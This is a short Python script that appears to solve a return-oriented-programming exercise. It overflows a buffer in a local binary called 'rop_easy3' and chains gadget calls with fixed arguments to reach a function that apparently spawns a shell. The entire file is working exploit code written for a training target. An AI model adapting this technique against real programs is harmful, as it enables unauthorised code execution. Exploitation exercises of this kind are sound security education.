#! /usr/bin/python3

import os
import struct

pop_ret = 0x08049234
pop_pop_ret = 0x08049233
exec_string = 0x080491b6
add_bin = 0x080491e5
add_sh = 0x08049236

# first, buffer overflow
payload = str.encode("A"*0x6c + "BBBB")

# the add_bin(0xdeadbeef) gadget
payload += struct.pack("I", add_bin)
payload += struct.pack("I",pop_ret)
payload += struct.pack("I", 0xdeadbeef)

# the add_sh(0xcafebabe, 0x0badf00d) gadget
payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0x0badf00d)

#our final destination
payload += struct.pack("I", exec_string)

os.system("./rop_easy3 \"%s\"" %payload)